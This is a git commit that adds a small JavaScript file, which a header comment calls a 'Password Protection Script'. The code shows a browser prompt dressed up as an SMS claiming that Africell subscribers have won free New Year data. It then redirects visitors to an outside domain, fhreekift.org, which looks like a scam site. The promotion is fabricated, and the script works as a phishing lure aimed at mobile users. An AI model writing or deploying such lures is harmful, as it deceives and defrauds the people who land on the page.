14f3151da0b8b636702ca45666efc1b062bbe0d7
mfednewblog9 <newekpeitid@gmail.com>
2025-12-31 11:58:54 +0100

    Create afri-active.js

---
+++ afri-active.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'ACTIVATE FREE DATA'
+password = prompt(
+  'SMS: Congratulations! Your Africell number is eligible to receive New Year Offer. Please press OK to Actiavte Data now.',
+  'ACTIVATE FREE DATA'
+);
+if (password != 'ACTIVATE FREE DATA') {
+  location.href = 'https://fhreekift.org/africell-newyr';
+}
